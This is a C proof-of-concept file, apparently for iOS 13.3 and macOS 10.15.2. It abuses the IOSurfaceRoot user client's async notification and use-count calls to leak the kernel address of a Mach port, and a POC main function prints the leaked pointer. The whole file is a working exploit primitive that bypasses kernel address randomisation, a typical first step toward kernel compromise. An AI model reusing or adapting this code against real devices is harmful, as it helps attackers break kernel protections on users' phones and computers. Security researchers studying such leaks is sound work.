#include <errno.h>
#include <stdint.h>             // uint*_t
#include <stdio.h>              // printf
#include <stdlib.h>             // malloc, free
#include <string.h>             // strerror, memcpy, memset
#include <sys/mman.h>           // mmap
#include <mach/mach.h>

#include "iokit.h"

#define LOG(str, args...) do { printf(str "\n", ##args); } while(0)
#define ADDR "0x%llx"

#define SafePortDestroy(x) \
do \
{ \
    if(MACH_PORT_VALID(x)) \
    { \
        mach_port_destroy(mach_task_self(), x); \
        x = MACH_PORT_NULL; \
    } \
} while(0)

#define IOSafeRelease(x) \
do \
{ \
    if(MACH_PORT_VALID(x)) \
    { \
        IOObjectRelease(x); \
        x = MACH_PORT_NULL; \
    } \
} while(0)

typedef uint64_t kptr_t;

typedef struct
{
    mach_msg_header_t head;
    struct
    {
        mach_msg_size_t size;
        natural_t type;
        uintptr_t ref[8];
    } notify;
    struct
    {
        kern_return_t ret;
        uintptr_t ref[8];
    } content;
    mach_msg_max_trailer_t trailer;
} msg_t;

const uint32_t IOSURFACE_UC_TYPE             =  0;
const uint32_t IOSURFACE_CREATE_SURFACE      =  0;
const uint32_t IOSURFACE_INCREMENT_USE_COUNT = 14;
const uint32_t IOSURFACE_DECREMENT_USE_COUNT = 15;
const uint32_t IOSURFACE_SET_NOTIFY          = 17;
#define IOSURFACE_CREATE_OUTSIZE 0xdd0 /* for iOS 13.3 / macOS 10.15.2, varies with version */

kptr_t leak_port_addr(mach_port_t port)
{
    kptr_t result = 0;
    kern_return_t ret;
    task_t self = mach_task_self();
    io_service_t service = MACH_PORT_NULL;
    io_connect_t client  = MACH_PORT_NULL;
    uint64_t refs[8] = { 0x4141414141414141, 0x4242424242424242, 0x4343434343434343, 0x4545454545454545, 0x4646464646464646, 0x4747474747474747, 0x4848484848484848, 0x4949494949494949 };

    uint32_t dict[] =
    {
        kOSSerializeMagic,
        kOSSerializeEndCollection | kOSSerializeDictionary | 1,

        kOSSerializeSymbol | 19,
        0x75534f49, 0x63616672, 0x6c6c4165, 0x6953636f, 0x657a, // "IOSurfaceAllocSize"
        kOSSerializeEndCollection | kOSSerializeNumber | 32,
        0x1000,
        0x0,
    };

    service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
    LOG("service: %x", service);
    if(!MACH_PORT_VALID(service)) goto out;

    ret = IOServiceOpen(service, self, IOSURFACE_UC_TYPE, &client);
    LOG("client: %x, %s", client, mach_error_string(ret));
    if(ret != KERN_SUCCESS || !MACH_PORT_VALID(client)) goto out;

    union
    {
        char _padding[IOSURFACE_CREATE_OUTSIZE];
        struct
        {
            mach_vm_address_t addr1;
            mach_vm_address_t addr2;
            mach_vm_address_t addr3;
            uint32_t id;
        } data;
    } surface;
    size_t size = sizeof(surface);
    ret = IOConnectCallStructMethod(client, IOSURFACE_CREATE_SURFACE, dict, sizeof(dict), &surface, &size);
    LOG("newSurface: %x, %s", surface.data.id, mach_error_string(ret));
    if(ret != KERN_SUCCESS) goto out;

    uint64_t in[3] = { 0, 0, 0 };
    ret = IOConnectCallAsyncStructMethod(client, IOSURFACE_SET_NOTIFY, port, refs, 8, in, sizeof(in), NULL, NULL);
    LOG("setNotify: %s", mach_error_string(ret));
    if(ret != KERN_SUCCESS) goto out;

    uint64_t id = surface.data.id;
    ret = IOConnectCallScalarMethod(client, IOSURFACE_INCREMENT_USE_COUNT, &id, 1, NULL, NULL);
    LOG("incrementUseCount: %s", mach_error_string(ret));
    if(ret != KERN_SUCCESS) goto out;

    ret = IOConnectCallScalarMethod(client, IOSURFACE_DECREMENT_USE_COUNT, &id, 1, NULL, NULL);
    LOG("decrementUseCount: %s", mach_error_string(ret));
    if(ret != KERN_SUCCESS) goto out;

    msg_t msg = { { 0 } };
    ret = mach_msg(&msg.head, MACH_RCV_MSG, 0, (mach_msg_size_t)sizeof(msg), port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    LOG("mach_msg: %s", mach_error_string(ret));
    if(ret != KERN_SUCCESS) goto out;

    result = msg.notify.ref[0] & ~3;

out:;
    IOSafeRelease(client);
    IOSafeRelease(service);
    return result;
}

#ifdef POC
int main(void)
{
    kern_return_t ret;
    int retval = -1;
    mach_port_t port = MACH_PORT_NULL;

    ret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    LOG("port: %x, %s", port, mach_error_string(ret));
    if(ret != KERN_SUCCESS || !MACH_PORT_VALID(port)) goto out;

    kptr_t addr = leak_port_addr(port);
    LOG("port addr: " ADDR, addr);

    retval = 0;

out:;
    SafePortDestroy(port);
    return retval;
}
#endif
